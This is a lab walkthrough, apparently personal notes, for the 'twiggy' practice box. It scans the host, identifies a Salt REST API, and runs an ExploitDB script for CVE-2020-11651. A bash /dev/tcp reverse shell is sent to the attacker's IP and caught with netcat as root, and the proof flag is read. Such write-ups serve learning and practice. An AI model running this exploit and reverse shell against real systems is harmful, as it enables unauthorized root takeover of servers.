`─$ autonmap -H 192.168.190.62 -t full`

`Running a full scan on 192.168.190.62`

`Host is likely running Unknown OS!`

`---------------------Starting Full Scan------------------------`

`PORT     STATE SERVICE`
`22/tcp   open  ssh`
`53/tcp   open  domain`
`80/tcp   open  http`
`4505/tcp open  unknown`
`4506/tcp open  unknown`
`8000/tcp open  http-alt`

`Making a script scan on all ports`

`PORT     STATE SERVICE VERSION`
`22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)`
`| ssh-hostkey:` 
`|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)`
`|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)`
`|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)`
`53/tcp   open  domain  NLnet Labs NSD`
`80/tcp   open  http    nginx 1.16.1`
`|_http-title: Home | Mezzanine`
`|_http-server-header: nginx/1.16.1`
`4505/tcp open  zmtp    ZeroMQ ZMTP 2.0`
`4506/tcp open  zmtp    ZeroMQ ZMTP 2.0`
`8000/tcp open  http    nginx 1.16.1`
`|_http-server-header: nginx/1.16.1`
`|_http-title: Site doesn't have a title (application/json).`
`|_http-open-proxy: Proxy might be redirecting requests`

`---------------------Finished all scans------------------------`

Check 192.168.190.62:80 and see that Mezzanine is running

Check 192.168.190.62:8000 and see an API is there
![[Pasted image 20240207231153.png]]

Throw that into google and it tells us that it's Salt REST API

![[Pasted image 20240207231246.png]]

See if it's on exploitDB, it is

![[Pasted image 20240207231337.png]]

Download the exploit

![[Pasted image 20240207231504.png]]

We know from the port scan earlier that 4505 is open so use that for the reverse shell

`python 48421x.py --master 192.168.190.62 --exec "bash -i >& /dev/tcp/192.168.45.235/4505 0>&1"`

`└─$ python 48421x.py --master 192.168.190.62 --exec "bash -i >& /dev/tcp/192.168.45.235/4505 0>&1"`
`[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.`
`/home/user/.pyenv/versions/3.8.1/lib/python3.8/site-packages/salt/transport/client.py:27: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.`
  `warn_until(`
`[+] Checking salt-master (192.168.190.62:4506) status... ONLINE`
`[+] Checking if vulnerable to CVE-2020-11651... YES`
`[*] root key obtained: 3J+XIUkNF7hBV4vmBMThrOVNtk/MMCHmT7QoUZ9lmQL9u4EJafv/kEAnCeEpdZRrgO7g2dEL2Ho=`
`[+] Attemping to execute bash -i >& /dev/tcp/192.168.45.235/4505 0>&1 on 192.168.190.62`
`[+] Successfully scheduled job: 20240208042155652733`
`/home/user/.pyenv/versions/3.8.1/lib/python3.8/site-packages/salt/transport/base.py:129: TransportWarning: Unclosed transport! <salt.transport.zeromq.RequestClient object at 0x7f0709d4be50>` 
  `File "48421x.py", line 376, in <module>`
    `main()`

  `File "48421x.py", line 325, in main`
    `channel = init_minion(args.master_ip, args.master_port)`

  `File "48421x.py", line 47, in init_minion`
    `return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')`

  `File "/home/user/.pyenv/versions/3.8.1/lib/python3.8/site-packages/salt/transport/client.py", line 31, in factory`
    `return salt.channel.client.ReqChannel.factory(opts, **kwargs)`

  `File "/home/user/.pyenv/versions/3.8.1/lib/python3.8/site-packages/salt/channel/client.py", line 55, in factory`
    `return SyncWrapper(`

  `File "/home/user/.pyenv/versions/3.8.1/lib/python3.8/site-packages/salt/utils/asynchronous.py", line 67, in __init__`
    `self.obj = cls(*args, **kwargs)`

  `File "/home/user/.pyenv/versions/3.8.1/lib/python3.8/site-packages/salt/channel/client.py", line 137, in factory`
    `transport = salt.transport.request_client(opts, io_loop=io_loop)`

  `File "/home/user/.pyenv/versions/3.8.1/lib/python3.8/site-packages/salt/transport/base.py", line 47, in request_client`
    `return salt.transport.zeromq.RequestClient(opts, io_loop=io_loop)`

  `File "/home/user/.pyenv/versions/3.8.1/lib/python3.8/site-packages/salt/transport/zeromq.py", line 890, in __init__`
    `super().__init__(opts, io_loop)`

  `File "/home/user/.pyenv/versions/3.8.1/lib/python3.8/site-packages/salt/transport/base.py", line 145, in __init__`
    `super().__init__()`

  `warnings.warn(`
`TransportWarning: Enable tracemalloc to get the object allocation traceback`

Catch

`$└─$ nc -nlvp 4505$`
`$Ncat: Version 7.94SVN ( https://nmap.org/ncat )$`
`$Ncat: Listening on [::]:4505$`
`$Ncat: Listening on 0.0.0.0:4505$`
`$Ncat: Connection from 192.168.190.62:46832.$`
`$bash: no job control in this shell$`
`$[root@twiggy root]#$` 

`[root@twiggy root]# ls`
`ls`
`proof.txt`
`[root@twiggy root]# cat proof.txt`
`cat proof.txt`
`d1f0855b0fc8d0986a3aebd463d415d8`
